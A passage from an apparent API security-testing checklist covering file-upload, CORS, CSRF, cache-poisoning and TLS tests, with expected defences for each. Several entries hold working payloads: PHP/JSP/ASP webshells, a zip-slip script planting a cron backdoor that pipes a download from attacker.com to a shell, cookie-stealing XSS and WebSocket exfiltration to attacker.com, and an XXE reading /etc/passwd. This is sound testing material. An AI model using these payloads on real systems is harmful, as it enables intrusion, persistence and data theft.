**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file named 'existing.jpg'<br>2. Upload another file with same name<br>3. Check if overwrites without warning

**Expected Result:** Should prevent overwriting or rename automatically

**Payload / PoC Example:**

```
Upload duplicate filename
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Manual

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0438 — Polyglot File Upload
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Create polyglot file (valid image + executable)<br>2. Upload as image<br>3. Access and check execution

**Expected Result:** Should validate file magic bytes not just headers

**Payload / PoC Example:**

```
GIFAR or similar polyglot file
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom Script

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0439 — ZIP Slip Attack
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Create ZIP with path traversal entries<br>2. Upload ZIP for server-side extraction<br>3. Check if files extracted outside directory

**Expected Result:** Should validate extracted file paths

**Payload / PoC Example:**

```
ZIP containing ../../malicious.txt
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom Script

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0440 — Archive Bomb / Zip Bomb Upload
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Create nested zip: 1KB → expands to 10GB<br>2. Upload and check if server extracts<br>3. Monitor CPU/RAM usage

**Expected Result:** Archive extraction has depth/size limits; extraction refused above threshold

**Payload / PoC Example:**

```
42.zip (42KB zip that extracts to 4.5PB)
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom zip bomb generator

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0441 — Race Condition - File Upload Overwrite
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file with specific name<br><br>2. Send multiple simultaneous uploads<br><br>3. Check which version persists<br><br>4. Test for race window exploitation

**Expected Result:** Should handle concurrent uploads safely

**Payload / PoC Example:**

```
10 concurrent POST /api/upload with same filename
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Turbo Intruder

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0442 — Polyglot WebShell Upload
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Create image file with embedded PHP/JSP webshell<br>2. Upload as legitimate image<br>3. Access uploaded file URL to execute commands<br>4. Try double extension, null byte, case variants

**Expected Result:** Content validated by magic bytes AND file execution blocked in upload directory

**Payload / PoC Example:**

```
# PHP webshell embedded in JPEG
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg

# GIF polyglot
GIF89a;<?php system($_GET['cmd']); ?>

# Double extension bypasses
shell.php.jpg          # Apache legacy
shell.php%00.jpg       # Null byte
shell.pHp              # Case variation
shell.php5             # Alternative extension
shell.php;.jpg         # Semicolon trick
shell.php.xxxjpg       # Unknown last extension

# Webshell payloads
<?php system($_GET['c']); ?>
<?php passthru($_POST['cmd']); ?>
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>  # JSP
<% eval request("cmd") %>                                     # ASP
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite, weevely

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0443 — ZIP Slip Path Traversal via Archive Upload
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Create ZIP with path traversal entries (../../)<br>2. Upload to any archive extraction endpoint<br>3. Check if files extracted outside intended directory<br>4. Try overwriting config/cron/authorized_keys

**Expected Result:** Archive extraction validates extracted paths; rejects entries outside target directory

**Payload / PoC Example:**

```
# Create malicious ZIP
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[c]); ?>')
    z.writestr('../../etc/cron.d/backdoor', '* * * * * root curl attacker.com/s|sh')
    z.writestr('../../../home/user/.ssh/authorized_keys', 'ssh-rsa ATTACKER_KEY')
"

# Using zip-slip toolkit
java -jar zip-slip.jar --output evil.zip --target ../../../../var/www/html/pwn.php --payload "<?php system(\$_GET['c']); ?>"

# Test: upload evil.zip → access https://target.com/pwn.php?c=id
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom Python, zip-slip toolkit

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0444 — EXIF Metadata Injection
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Embed XSS/SQLi/CMDi payloads in JPEG EXIF fields<br>2. Upload image<br>3. Check if EXIF data processed/displayed without sanitization<br>4. Target: Comment, Artist, Copyright, GPS fields

**Expected Result:** EXIF metadata stripped before storage; never rendered without encoding

**Payload / PoC Example:**

```
# Inject XSS into EXIF
exiftool -Comment='<script>alert(document.cookie)</script>' image.jpg
exiftool -Artist='"><img src=x onerror=fetch("https://attacker.com/"+document.cookie)>' img.jpg
exiftool -XPComment='<?php system($_GET["c"]); ?>' image.jpg

# SQLi in EXIF
exiftool -Comment="' OR '1'='1" image.jpg
exiftool -Artist="admin'--" image.jpg

# Check if GPS data triggers SSRF during map preview
exiftool -GPSLatitude="169.254.169.254" -GPSLongitude="0" image.jpg
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** exiftool, Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0445 — Stored XSS via filename / SVG / EXIF
**Phase:** 11-File Upload · **Category:** Injection · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** POST API request / relevant parameter

**Test Steps:** 1. Filename: &lt;script&gt;alert(1)&lt;/script&gt;.jpg<br>2. EXIF comment with payload<br>3. SVG with &lt;script&gt;

**Expected Result:** Sanitize filename render; strip metadata

**Payload / PoC Example:**

```
<script>alert(1)</script>.jpg
```

**Impact:** Account takeover via admin XSS

**Tools:** exiftool,Burp

**References:** -&gt;[XSS checklist](#/checklist/xss); PortSwigger Research XSS (Gareth Heyes); OWASP API Top 10; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0446 — Path traversal via filename
**Phase:** 11-File Upload · **Category:** Path Traversal · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST File-path parameter (../ traversal)

**Test Steps:** 1. Upload with filename ../../../etc/cron.d/x or ..%2f..%2fweb/shell.jsp<br>2. Check storage location

**Expected Result:** Sanitize filename and use UUID

**Payload / PoC Example:**

```
filename: ../../../etc/cron.d/x
```

**Impact:** Arbitrary file write -&gt; RCE

**Tools:** Burp Suite

**References:** -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Orange Tsai path-confusion research; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0447 — Zip slip
**Phase:** 11-File Upload · **Category:** Path Traversal · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST File-path parameter (../ traversal)

**Test Steps:** 1. Build zip with entries containing ../../etc/cron.d/x<br>2. Upload to extraction endpoint<br>3. Verify file written outside upload dir

**Expected Result:** Validate extracted paths

**Payload / PoC Example:**

```
zip with ../../malicious
```

**Impact:** RCE / persistence

**Tools:** Custom python,Burp

**References:** -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Orange Tsai path-confusion research; PortSwigger Academy; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0448 — Whitelist-bypass extensions
**Phase:** 11-File Upload · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Upload shell.php shell.pHp shell.phtml shell.phar shell.php.jpg shell.jpg.php shell.jpg%00.php shell.jpg::$DATA .htaccess web.config<br>2. Access uploaded file<br>3. Verify execution

**Expected Result:** Whitelist by content + extension

**Payload / PoC Example:**

```
shell.jpg.php
```

**Impact:** RCE on web server

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0449 — MIME-only check bypass
**Phase:** 11-File Upload · **Category:** Security Misconfiguration · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Server config / response headers / defaults

**Test Steps:** 1. Upload .php with Content-Type: image/png<br>2. Or rename JPG to PHP after upload<br>3. Test polyglot GIFAR / PHAR-JPG

**Expected Result:** Validate by content magic bytes

**Payload / PoC Example:**

```
Upload shell.php with Content-Type: image/png
```

**Impact:** RCE

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0450 — Direct file access without authn
**Phase:** 11-File Upload · **Category:** Security Misconfiguration · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Server config / response headers / defaults

**Test Steps:** 1. Upload file; capture URL<br>2. Logout<br>3. Access URL; iterate sequential filenames

**Expected Result:** Authn for file access; UUID filenames

**Payload / PoC Example:**

```
GET /uploads/123.pdf without auth
```

**Impact:** Cross-tenant file leak

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API1:2023 Broken Object Level Authorization

---

## API-0451 — XXE via SVG / DOCX upload
**Phase:** 11-File Upload · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST XML request body / uploaded XML

**Test Steps:** 1. Upload SVG containing XXE entity<br>2. View or process the file (avatar render etc.)<br>3. Read /etc/passwd or trigger SSRF

**Expected Result:** Disable XML entities

**Payload / PoC Example:**

```
<svg><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
```

**Impact:** File read / SSRF

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0452 — CORS misconfiguration with credentials
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Origin header / CORS preflight

**Test Steps:** 1. Send Origin: https://attacker.com<br>2. Check ACAO and ACAC headers<br>3. Test null Origin via sandboxed iframe

**Expected Result:** Strict origin allow-list; never wildcard with credentials

**Payload / PoC Example:**

```
Origin: https://attacker.com
```

**Impact:** Cross-origin data theft -&gt; ATO

**Tools:** Corsy,Burp

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0453 — CORS Misconfiguration
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send request with Origin: attacker.com<br>2. Check Access-Control-Allow-Origin<br>3. Test credentials

**Expected Result:** Should whitelist specific origins only

**Payload / PoC Example:**

```
Access-Control-Allow-Origin: * with credentials
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0454 — CORS Wildcard Origin
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send request with arbitrary Origin<br><br>2. Check Access-Control-Allow-Origin<br><br>3. Verify if credentials allowed with wildcard<br><br>4. Exploit cross-origin access

**Expected Result:** Should whitelist specific origins

**Payload / PoC Example:**

```
Origin: https://attacker.com returns ACAO: *
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0455 — CORS Origin Reflection
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send request with malicious Origin<br><br>2. Check if Origin reflected in ACAO header<br><br>3. Verify credentials mode<br><br>4. Steal sensitive data cross-origin

**Expected Result:** Should not reflect arbitrary origins

**Payload / PoC Example:**

```
ACAO reflects any Origin header value
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0456 — CORS Null Origin
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send request with Origin: null<br><br>2. Check if null origin allowed<br><br>3. Exploit via sandboxed iframe<br><br>4. Access API cross-origin

**Expected Result:** Should not allow null origin

**Payload / PoC Example:**

```
Origin: null allowed with credentials
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0457 — CORS Subdomain Trust
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Check CORS configuration for subdomain trust<br><br>2. Find XSS on any subdomain<br><br>3. Use subdomain to make CORS requests<br><br>4. Steal data from main API

**Expected Result:** Should not trust all subdomains

**Payload / PoC Example:**

```
*.example.com allowed
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0458 — CORS Pre-flight Bypass
**Phase:** 12-Misconfig · **Category:** CORS · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Origin header / CORS preflight

**Test Steps:** 1. Send simple request without preflight<br><br>2. Check if state-changing action performed<br><br>3. Bypass CORS via content-type manipulation<br><br>4. Exploit without preflight

**Expected Result:** Should require preflight for sensitive operations

**Payload / PoC Example:**

```
POST with text/plain bypasses preflight
```

**Impact:** Permissive CORS allows cross-origin theft of authenticated data

**Tools:** Burp Suite

**References:** -&gt;[CORS checklist](#/checklist/cors); PortSwigger Academy CORS; s0md3v/Corsy; W3C CORS spec; API8:2023 Security Misconfiguration

---

## API-0459 — CSRF on Profile Update
**Phase:** 12-Misconfig · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Profile Update — State-changing endpoint under cookie auth

**Test Steps:** 1. Craft malicious HTML form<br>2. Auto-submit profile update<br>3. Victim's profile gets modified

**Expected Result:** Should validate CSRF token

**Payload / PoC Example:**

```
Auto-submit form changes victim email
```

**Impact:** Forced state-changing request in victim's session

**Tools:** Burp Suite

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0460 — CSRF on Resource Creation
**Phase:** 12-Misconfig · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Create Resource — State-changing endpoint under cookie auth

**Test Steps:** 1. Craft malicious form<br>2. Auto-submit to create endpoint<br>3. Check if created without CSRF token

**Expected Result:** Should validate CSRF token

**Payload / PoC Example:**

```
Auto-submit POST to /api/posts
```

**Impact:** Forced state-changing request in victim's session

**Tools:** Burp Suite

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0461 — CSRF on Update
**Phase:** 12-Misconfig · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Update Resource — State-changing endpoint under cookie auth

**Test Steps:** 1. Craft auto-submit form with PUT/PATCH<br>2. Victim executes<br>3. Check if updated

**Expected Result:** Should validate CSRF token

**Payload / PoC Example:**

```
Auto-submit form to update resource
```

**Impact:** Forced state-changing request in victim's session

**Tools:** Burp Suite

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0462 — CSRF on Delete
**Phase:** 12-Misconfig · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Delete Resource — State-changing endpoint under cookie auth

**Test Steps:** 1. Craft malicious request<br>2. Trick victim into executing<br>3. Check if resource deleted

**Expected Result:** Should validate CSRF token

**Payload / PoC Example:**

```
<img src="https://api.com/delete/123">
```

**Impact:** Forced state-changing request in victim's session

**Tools:** Burp Suite

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0463 — WebSocket Cross-Site Hijacking (CSWSH)
**Phase:** 12-Misconfig · **Category:** CSRF · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** State-changing endpoint under cookie auth

**Test Steps:** 1. Check if WebSocket uses cookie auth (not token in protocol)<br>2. Create malicious page that opens WebSocket to target<br>3. Browser sends cookies automatically; steal messages

**Expected Result:** WebSocket uses token-based auth; validates Origin header strictly

**Payload / PoC Example:**

```
<script>var ws=new WebSocket('wss://target.com/ws'); ws.onmessage=function(e){fetch('https://attacker.com/?d='+e.data)}</script>
```

**Impact:** Forced state-changing request in victim's session

**Tools:** Burp Suite

**References:** -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger Academy CSRF; OWASP CSRF Prevention Cheat Sheet; API2:2023 Broken Authentication

---

## API-0464 — Cache poisoning via unkeyed headers
**Phase:** 12-Misconfig · **Category:** Caching · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Cacheable responses / cache keys

**Test Steps:** 1. Param Miner -&gt; Guess headers<br>2. Discover unkeyed header (X-Forwarded-Host etc.)<br>3. Poison shared cache; verify with clean session

**Expected Result:** Include all impacting headers in cache key

**Payload / PoC Example:**

```
X-Forwarded-Host: attacker.com
```

**Impact:** XSS at scale; redirect

**Tools:** Burp Param Miner

**References:** -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning (PortSwigger Research); OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0465 — Web cache deception
**Phase:** 12-Misconfig · **Category:** Caching · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GET Cacheable responses / cache keys

**Test Steps:** 1. Append /x.css to authenticated endpoint<br>2. Check if CDN caches PII<br>3. Access cached path unauth from another IP

**Expected Result:** Don't cache authenticated responses; strict path rules

**Payload / PoC Example:**

```
GET /api/me/account/profile/x.css
```

**Impact:** PII leak via cache

**Tools:** Manual

**References:** -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning (PortSwigger Research); OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0466 — Cache Poisoning
**Phase:** 12-Misconfig · **Category:** Caching · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cacheable responses / cache keys

**Test Steps:** 1. Inject headers that affect caching<br>2. Store malicious response<br>3. Serve poisoned content to users

**Expected Result:** Should separate cached and uncached content properly

**Payload / PoC Example:**

```
X-Forwarded-Host manipulation for cache poisoning
```

**Impact:** Cache poisoning/deception serving attacker or private content

**Tools:** Burp Suite

**References:** -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning (PortSwigger Research); OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0467 — Web Cache Poisoning
**Phase:** 12-Misconfig · **Category:** Caching · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Cacheable responses / cache keys

**Test Steps:** 1. Identify cached endpoint<br><br>2. Inject malicious content via unkeyed header<br><br>3. Poison cache with malicious response<br><br>4. Serve malicious content to users

**Expected Result:** Should key cache on all relevant headers

**Payload / PoC Example:**

```
X-Forwarded-Host: attacker.com
```

**Impact:** Cache poisoning/deception serving attacker or private content

**Tools:** Burp Suite

**References:** -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning (PortSwigger Research); OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0468 — Token Caching in Response
**Phase:** 12-Misconfig · **Category:** Caching · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Cacheable responses / cache keys

**Test Steps:** 1. Authenticate and receive token<br><br>2. Check if response cached<br><br>3. Access cached authentication response<br><br>4. Retrieve other users' tokens

**Expected Result:** Should never cache authentication responses

**Payload / PoC Example:**

```
Cached login response with JWT
```

**Impact:** Cache poisoning/deception serving attacker or private content

**Tools:** Burp Suite

**References:** -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning (PortSwigger Research); OWASP WSTG; API8:2023 Security Misconfiguration

---

## API-0469 — Weak TLS / cipher
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. testssl.sh --severity HIGH https://api.target.com<br>2. Verify TLS1.2+ only and strong ciphers<br>3. Check cert validity

**Expected Result:** TLS 1.2+ and strong ciphers

**Payload / PoC Example:**

```
testssl --severity HIGH
```

**Impact:** Downgrade -&gt; MITM

**Tools:** testssl.sh,sslyze

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API8:2023 Security Misconfiguration

---

## API-0470 — Cryptocurrency Payment Double-Spend Race
**Phase:** 12-Misconfig · **Category:** Cryptographic Failure · **OWASP API 2023:** API6:2023 Unrestricted Access to Sensitive Business Flows · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment/Transaction — TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Initiate two cryptocurrency payments from same wallet balance<br>2. Submit both concurrently before confirmation<br>3. Check if both orders fulfilled

**Expected Result:** Payment confirmation requires blockchain finality; no credit before confirmation

**Payload / PoC Example:**

```
Turbo Intruder: two simultaneous POST /pay/crypto with same TXID
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Turbo Intruder

**References:** -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT vulnerabilities; PortSwigger Academy JWT; RFC 8725; ticarpi/jwt_tool; API6:2023 Unrestricted Access to Sensitive Business Flows

---

## API-0471 — No Data Encryption at Rest for API Storage
